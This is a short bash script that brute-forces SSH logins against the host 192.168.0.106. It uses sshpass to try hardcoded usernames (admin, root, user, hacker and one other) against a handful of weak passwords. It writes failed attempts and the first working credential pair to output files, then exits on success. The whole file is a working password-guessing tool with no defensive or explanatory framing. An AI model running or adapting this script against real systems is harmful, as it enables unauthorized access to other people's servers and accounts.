#!/bin/bash
# Checking credentials
# Sshpass needs to be installed
# Variables
varHost="192.168.0.106"
varlogin=
varPassword=

for varUser in  admin root eserrock user hacker
do
for varPass in terminal script qweri 123qaz
do
if sshpass -p $varPass ssh $varUser@$varHost -t "exit;"
then 
    echo "shpass -p $varPass ssh $varUser@$varHost" >> output-correct
    echo "Username and password have been SUCCESSFULLY SELECTED =^.^="
    exit
else
    echo "The password \"$varPass\" is not correct for the $varUser@$varHost" >> output-error
fi	
done
done
